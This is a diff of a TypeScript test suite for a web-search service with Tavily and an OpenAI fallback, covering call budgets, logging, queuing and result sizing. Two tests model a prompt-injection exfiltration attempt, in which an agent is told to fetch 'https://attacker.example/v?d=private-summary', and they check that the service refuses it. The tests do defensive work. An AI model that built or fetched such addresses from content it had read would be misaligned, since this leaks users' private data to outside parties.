@@ -9,13 +9,15 @@ import { StreamableHTTPClientTransport } from '@modelcontextprotocol/sdk/client/
 import { z } from 'zod';
 import type { Actor, Caller } from '@merv/contracts';
 import { ToolRegistry, conversationUse, describeTool } from '../packages/api/src/registry.js';
+import { fit } from '../packages/pi/src/fit.js';
 import { piTool } from '../packages/pi/src/relay-schema.js';
 import { piModelToolName } from '../packages/pi/src/tool-names.js';
 import { WebService } from '../packages/web/src/index.js';
 import { webTools } from '../packages/web/src/tools.js';
 import { webConfig } from '../packages/web/src/input.js';
+import { jsonBytes, MAX_ANSWER_BYTES } from '../packages/web/src/normalize.js';
 import { USER_AGENT } from '../packages/web/src/providers.js';
-import type { WebPage, WebSearch } from '../packages/web/src/types.js';
+import type { WebCall, WebPage, WebSearch } from '../packages/web/src/types.js';
 import { loadConfiguration } from '../src/config.js';
 import { createApp } from './fixtures/app.js';
 import { fixture as piFixture } from './fixtures/pi.js';
@@ -206,18 +208,18 @@ test('Tavily falls back to OpenAI’s hosted web search exactly when Nisa does',
     origin: tavily.origin,
     fallback: { keyEnv: openaiEnv, origin: openai.origin, model: 'gpt-test' },
   };
-  const web = new WebService(config);
+  const web = new WebService(config, { log: () => {} });
   const refusal = (status: number): Reply => ({
     status,
     body: { detail: { error: 'upstream words never repeated' } },
   });
   const input = { query: 'q', search_depth: 'advanced', topic: 'news', time_range: 'month' };
-  // A missing, invalid or forbidden key, or a used-up plan; 429 only once its retries are spent.
-  for (const status of [401, 403, 432, 433, 429]) {
+  // A missing, invalid or forbidden key, or a used-up plan: never a rate limit, which passes.
+  for (const status of [401, 403, 432, 433]) {
     tavilyReply = refusal(status);
     const [tried, grounding] = [tavily.seen.length, openai.seen.length];
     const result = await web.search(caller, input);
-    assert.equal(tavily.seen.length - tried, status === 429 ? 3 : 1, `${status}`);
+    assert.equal(tavily.seen.length - tried, 1, `${status}`);
     assert.equal(openai.seen.length - grounding, 1);
     assert.equal(result.provider, 'openai_web_search');
     assert.equal(result.normalization_note, 'Tavily unavailable; used OpenAI web search');
@@ -231,6 +233,8 @@ test('Tavily falls back to OpenAI’s hosted web search exactly when Nisa does',
     model: 'gpt-test',
     tools: [{ type: 'web_search' }],
     include: ['web_search_call.action.sources'],
+    // One budgeted call is at most two hosted searches, one for a basic one.
+    max_tool_calls: 2,
     reasoning: { effort: 'low' },
     max_output_tokens: 4096,
     store: false,
@@ -256,10 +260,13 @@ test('Tavily falls back to OpenAI’s hosted web search exactly when Nisa does',
     normalization_note: 'Tavily unavailable; used OpenAI web search',
   });
   assert.equal(openai.seen.at(-1)!.body.max_output_tokens, 2048);
+  assert.equal(openai.seen.at(-1)!.body.max_tool_calls, 1);
 
-  // Anything else is Tavily's failure, retried when it may pass, and never falls back.
+  // Anything else is Tavily's failure, retried when it may pass, and never falls back: a rate
+  // limit (429) included, which Nisa does not fall back on either.
   for (const [status, tries, code, http] of [
     [500, 3, 'web_upstream_error', 502],
+    [429, 3, 'web_rate_limited', 429],
     [400, 1, 'web_request_refused', 422],
   ] as const) {
     tavilyReply = refusal(status);
@@ -289,7 +296,7 @@ test('Tavily falls back to OpenAI’s hosted web search exactly when Nisa does',
 
   // Without a Tavily key the fallback serves alone, and Tavily hears nothing.
   const tried = tavily.seen.length;
-  const alone = new WebService({ ...config, keyEnv: 'MERV_WEB_TEST_UNSET_KEY' });
+  const alone = new WebService({ ...config, keyEnv: 'MERV_WEB_TEST_UNSET_KEY' }, { log: () => {} });
   assert.equal(
     (await alone.search(caller, input)).normalization_note,
     'Tavily is not configured; used OpenAI web search',
@@ -402,30 +409,36 @@ test('a page is read only through Tavily, never fetched by Merv, and cut to its 
   assert.equal(page.seen.length, 0);
 });
 
-test('a project’s day and the process’s in-flight calls are bounded, refused before any request', async (t) => {
-  let gate: Promise<void> | undefined;
-  const tavily = await provider(t, async () => {
-    await gate;
-    return { body: tavilyResults(1) };
-  });
+/** Waits for `condition`, at most five seconds. */
+async function until(condition: () => boolean) {
+  const deadline = Date.now() + 5000;
+  while (!condition() && Date.now() < deadline)
+    await new Promise((resolve) => setTimeout(resolve, 10));
+  assert.ok(condition());
+}
+const project = (projectId: string): Caller => ({ ...caller, projectId });
+
+test('a project’s day, the deployment’s and its fallback searches’ are bounded, refused before any request', async (t) => {
+  let tavilyReply: Reply = { body: tavilyResults(1) };
+  const tavily = await provider(t, () => tavilyReply);
   let now = Date.parse('2026-09-26T23:59:00Z');
+  const logged: WebCall[] = [];
   const web = new WebService(
     {
       keyEnv: keyEnv(t, 'tvly-fixture'),
       origin: tavily.origin,
       dailyCallsPerProject: 2,
-      maxInFlight: 2,
+      dailyCalls: 3,
     },
-    () => now,
+    { clock: () => now, log: (record) => logged.push(record) },
   );
-  const project = (projectId: string): Caller => ({ ...caller, projectId });
-  await web.search(caller, { query: 'one' });
+  await web.search(caller, { query: 'query-one' });
   // Answers that need no provider cost nothing.
   await web.search(caller, { query: '' });
   await web.extract(caller, { url: 'not an address' });
   await web.extract(caller, { url: 'https://example.com/two' });
   for (const call of [
-    () => web.search(caller, { query: 'three' }),
+    () => web.search(caller, { query: 'query-three' }),
     () => web.extract(caller, { url: 'https://example.com/three' }),
   ])
     await assert.rejects(call(), {
@@ -434,34 +447,223 @@ test('a project’s day and the process’s in-flight calls are bounded, refused
       message: 'This project has made its 2 web calls for today; more are allowed after 00:00 UTC',
     });
   assert.equal(tavily.seen.length, 2);
-  // Another project has its own day, and the next UTC day starts afresh.
-  await web.search(project('project-b'), { query: 'elsewhere' });
-  now = Date.parse('2026-09-27T00:00:01Z');
-  await web.search(caller, { query: 'tomorrow' });
-
-  const release = deferred();
-  gate = release.promise;
-  const held = [
-    web.search(project('project-c'), { query: 'held' }),
-    web.search(project('project-d'), { query: 'held' }),
-  ];
-  const deadline = Date.now() + 5000;
-  while (tavily.seen.length < 6 && Date.now() < deadline)
-    await new Promise((resolve) => setTimeout(resolve, 10));
-  await assert.rejects(web.search(project('project-e'), { query: 'third' }), {
-    code: 'web_busy',
-    status: 429,
-  });
-  assert.equal(tavily.seen.length, 6);
-  release.resolve();
-  await Promise.all(held);
-  // The refusal took nothing from project-e's day.
-  gate = undefined;
-  await web.search(project('project-e'), { query: 'third' });
-  await web.search(project('project-e'), { query: 'fourth' });
-  await assert.rejects(web.search(project('project-e'), { query: 'fifth' }), {
+  // Another project has its own day, but projects cost nothing to make: the deployment's day
+  // bounds them all.
+  await web.search(project('project-b'), { query: 'query-elsewhere' });
+  await assert.rejects(web.search(project('project-c'), { query: 'query-more' }), {
     code: 'web_budget_exhausted',
+    status: 429,
+    message: 'This deployment has made its 3 web calls for today; more are allowed after 00:00 UTC',
   });
+  assert.equal(tavily.seen.length, 3);
+  // The next UTC day starts afresh.
+  now = Date.parse('2026-09-27T00:00:01Z');
+  await web.search(caller, { query: 'query-tomorrow' });
+  // One line for each call a provider was asked for: who, which, how long, never what.
+  assert.deepEqual(
+    logged.map(({ ms, ...rest }) => (assert.equal(typeof ms, 'number'), rest)),
+    [
+      ['web.search', 'project-a'],
+      ['web.extract', 'project-a'],
+      ['web.search', 'project-b'],
+      ['web.search', 'project-a'],
+    ].map(([tool, projectId]) => ({
+      event: 'web.call',
+      tool,
+      projectId,
+      actorId: 'alice',
+      providers: ['tavily'],
+    })),
+  );
+  assert.doesNotMatch(JSON.stringify(logged), /query-|example\.com/);
+
+  // Fallback searches, each a model's grounded answer, have a smaller day of their own for the
+  // whole deployment, and a failed call says which provider failed.
+  const openai = await provider(t, () => ({ body: grounded() }));
+  const fallback = { keyEnv: keyEnv(t, 'sk-fixture'), origin: openai.origin };
+  const both = new WebService(
+    { keyEnv: keyEnv(t, 'tvly-fixture'), origin: tavily.origin, fallback, fallbackDailyCalls: 1 },
+    { log: (record) => logged.push(record) },
+  );
+  tavilyReply = { status: 401, body: {} };
+  assert.equal((await both.search(caller, { query: 'q' })).provider, 'openai_web_search');
+  await assert.rejects(both.search(caller, { query: 'q' }), {
+    code: 'web_budget_exhausted',
+    status: 429,
+    message:
+      "Tavily refused this deployment's key (HTTP 401), and this deployment has made its 1 OpenAI web searches for today; more are allowed after 00:00 UTC",
+  });
+  assert.equal(openai.seen.length, 1);
+  assert.deepEqual(
+    logged.slice(-2).map(({ providers, code }) => [providers, code]),
+    [
+      [['tavily', 'openai_web_search'], undefined],
+      [['tavily'], 'web_budget_exhausted'],
+    ],
+  );
+  const alone = new WebService(
+    { keyEnv: 'MERV_WEB_TEST_UNSET_KEY', fallback, fallbackDailyCalls: 1 },
+    { log: () => {} },
+  );
+  await alone.search(caller, { query: 'q' });
+  await assert.rejects(alone.search(caller, { query: 'q' }), {
+    code: 'web_budget_exhausted',
+    message:
+      'This deployment has made its 1 OpenAI web searches for today; more are allowed after 00:00 UTC',
+  });
+  assert.equal(openai.seen.length, 2);
+});
+
+test('calls in flight are shared out by project and wait their turn before web_busy', async (t) => {
+  let gate: Promise<void> | undefined;
+  const tavily = await provider(t, async () => {
+    await gate;
+    return { body: tavilyResults(1) };
+  });
+  const web = new WebService(
+    {
+      keyEnv: keyEnv(t, 'tvly-fixture'),
+      origin: tavily.origin,
+      maxInFlight: 3,
+      maxInFlightPerProject: 2,
+      queueMs: 800,
+      dailyCallsPerProject: 3,
+    },
+    { log: () => {} },
+  );
+  let release = deferred();
+  gate = release.promise;
+  // One project holds its two slots; its third call waits its turn, then is refused, charged
+  // nothing, and no provider hears of it.
+  const held = [web.search(caller, { query: 'a1' }), web.search(caller, { query: 'a2' })];
+  await until(() => tavily.seen.length === 2);
+  const started = Date.now();
+  await assert.rejects(web.search(caller, { query: 'a3' }), { code: 'web_busy', status: 429 });
+  assert.ok(Date.now() - started >= 700);
+  assert.equal(tavily.seen.length, 2);
+  // Another project has the process's third slot, and a fourth call waits for one to end.
+  const other = web.search(project('project-b'), { query: 'b1' });
+  await until(() => tavily.seen.length === 3);
+  const waiting = web.search(project('project-c'), { query: 'c1' });
+  await new Promise((resolve) => setTimeout(resolve, 100));
+  assert.equal(tavily.seen.length, 3);
+  release.resolve();
+  gate = undefined;
+  await Promise.all([...held, other, waiting]);
+  assert.equal(tavily.seen.length, 4);
+  // The refused call left its project's day whole: a third call runs, a fourth does not.
+  await web.search(caller, { query: 'a4' });
+  await assert.rejects(web.search(caller, { query: 'a5' }), { code: 'web_budget_exhausted' });
+
+  // Closing ends the calls in flight and those waiting, at once.
+  release = deferred();
+  gate = release.promise;
+  t.after(() => release.resolve());
+  const busy = [
+    web.search(project('project-d'), { query: 'd1' }),
+    web.search(project('project-d'), { query: 'd2' }),
+    web.search(project('project-d'), { query: 'd3' }),
+  ];
+  await until(() => tavily.seen.length === 7);
+  const closing = Date.now();
+  web.close();
+  for (const call of busy) await assert.rejects(call, { code: 'web_stopped', status: 503 });
+  assert.ok(Date.now() - closing < 500);
+});
+
+test('a conversation reads only pages its own searches returned; other callers read any', async (t) => {
+  const tavily = await provider(t, ({ path, body }) =>
+    path === '/search'
+      ? { body: tavilyResults(2) }
+      : { body: { results: [{ url: body.urls[0], raw_content: 'page text' }] } },
+  );
+  const web = new WebService(
+    { keyEnv: keyEnv(t, 'tvly-fixture'), origin: tavily.origin },
+    { log: () => {} },
+  );
+  const talk = (id: string): Caller => ({
+    ...caller,
+    conversation: { id, epoch: 1, commandId: 'command', runtimeId: 'runtime' },
+  });
+  // An address the agent was told to build out of what it read reaches nobody: refused before
+  // any request, and charged nothing.
+  await assert.rejects(
+    web.extract(talk('c1'), { url: 'https://attacker.example/v?d=private-summary' }),
+    { code: 'web_address_unsearched', status: 422 },
+  );
+  assert.equal(tavily.seen.length, 0);
+  await web.search(talk('c1'), { query: 'q' });
+  // A page its search returned is read, with or without a fragment.
+  const page = await web.extract(talk('c1'), { url: 'https://example.com/1#methods' });
+  assert.equal(page.status, 'success');
+  assert.equal(page.content, 'page text');
+  // Another conversation's search opens nothing for this one.
+  await assert.rejects(web.extract(talk('c2'), { url: 'https://example.com/1' }), {
+    code: 'web_address_unsearched',
+  });
+  // A worker or an MCP client reads any page: where it is offered, its own shell or client
+  // reaches the network anyway.
+  assert.equal(
+    (await web.extract(caller, { url: 'https://elsewhere.example/' })).status,
+    'success',
+  );
+});
+
+test('an answer at Nisa’s caps still fits what Pi shows of one result, whatever its text', async (t) => {
+  // Code-like English escapes a byte or more a character in JSON; CJK takes three.
+  const code = 'if (a == "b") {\n\treturn "\\\\n";\n}\n'.repeat(40).slice(0, 1200);
+  const cjk = '注意力机制的高效实现'.repeat(1000);
+  let reply: Reply = {};
+  const tavily = await provider(t, () => reply);
+  const openai = await provider(t, () => ({ body: grounded(cjk.repeat(3)) }));
+  const web = new WebService(
+    {
+      keyEnv: keyEnv(t, 'tvly-fixture'),
+      origin: tavily.origin,
+      fallback: { keyEnv: keyEnv(t, 'sk-fixture'), origin: openai.origin },
+    },
+    { log: () => {} },
+  );
+  for (const text of [code, cjk]) {
+    reply = {
+      body: {
+        results: Array.from({ length: 20 }, (_, index) => ({
+          title: `Result ${index}`,
+          url: `https://example.com/${index}`,
+          content: text,
+          score: 0.5,
+        })),
+      },
+    };
+    const result = await web.search(caller, { query: 'q', max_results: 20 });
+    assert.ok(jsonBytes(result) <= MAX_ANSWER_BYTES, `${jsonBytes(result)}`);
+    // Pi shows it whole, never an index pointing at a get tool web search does not have.
+    assert.deepEqual(fit('web.search', result), result);
+    assert.equal(result.result_count, 20);
+    assert.equal(result.content_truncated, true);
+    assert.ok(result.content_budget_chars! < 24_000);
+    const shown = result.results.reduce((sum, { content }) => sum + content.length, 0);
+    assert.ok(shown > 5000 && shown <= result.content_budget_chars!, `${shown}`);
+  }
+  // A page read at its cap, and the fallback's answer at its own.
+  reply = { body: { results: [{ url: 'https://example.com/page', raw_content: cjk.repeat(3) }] } };
+  const page = await web.extract(caller, { url: 'https://example.com/page' });
+  assert.equal(page.status, 'success');
+  assert.deepEqual(fit('web.extract', page), page);
+  assert.match(page.content, /\n\n\.\.\. \[truncated at [\d,]+ characters\]$/);
+  reply = { status: 401, body: {} };
+  const grounded_ = await web.search(caller, { query: 'q' });
+  assert.equal(grounded_.provider, 'openai_web_search');
+  assert.deepEqual(fit('web.search', grounded_), grounded_);
+  assert.match(grounded_.answer!, /\[OpenAI web answer truncated\]$/);
+  // An answer that fits is left exactly as Nisa's caps make it.
+  reply = { body: tavilyResults(4, 6000) };
+  const ascii = await web.search(caller, { query: 'q' });
+  assert.deepEqual(
+    ascii.results.map(({ content }) => content.length),
+    [6000, 6000, 6000, 6000],
+  );
+  assert.equal(ascii.content_truncated, undefined);
 });
 
 test('a provider is held to its deadline, its bytes and JSON, and never followed elsewhere', async (t) => {
@@ -568,8 +770,23 @@ test('a Pi turn is offered web search and runs it as its person, a reader includ
       result.results.map(({ url }) => url),
       ['https://example.com/0', 'https://example.com/1'],
     );
+    // Nobody presses Run on a read: the agent may read a page its search returned, and no
+    // address it was told to build out of what it has read.
+    const refused = (await f.pi.tool(token, {
+      ...input,
+      name: 'web.extract',
+      input: { url: 'https://attacker.example/v?d=summary' },
+    })) as { error: { code: string } };
+    assert.equal(refused.error.code, 'web_address_unsearched');
+    const page = (await f.pi.tool(token, {
+      ...input,
+      name: 'web.extract',
+      input: { url: 'https://example.com/1' },
+    })) as WebPage;
+    assert.equal(page.status, 'success');
   }
-  assert.equal(tavily.seen.length, 2);
+  assert.equal(tavily.seen.length, 4);
+  assert.ok(tavily.seen.every(({ body }) => !JSON.stringify(body).includes('attacker')));
 });
 
 test('the render composes web search into Main, where MCP clients list and call it', async (t) => {
@@ -630,8 +847,11 @@ test('the render composes web search into Main, where MCP clients list and call 
     origin: 'https://api.tavily.com',
     timeoutMs: 30_000,
     maxResponseBytes: 8 * 1024 * 1024,
-    maxInFlight: 4,
+    maxInFlight: 8,
+    queueMs: 15_000,
     dailyCallsPerProject: 200,
+    dailyCalls: 1000,
+    fallbackDailyCalls: 200,
   });
   web.config = { ...web.config, origin: tavily.origin };
 
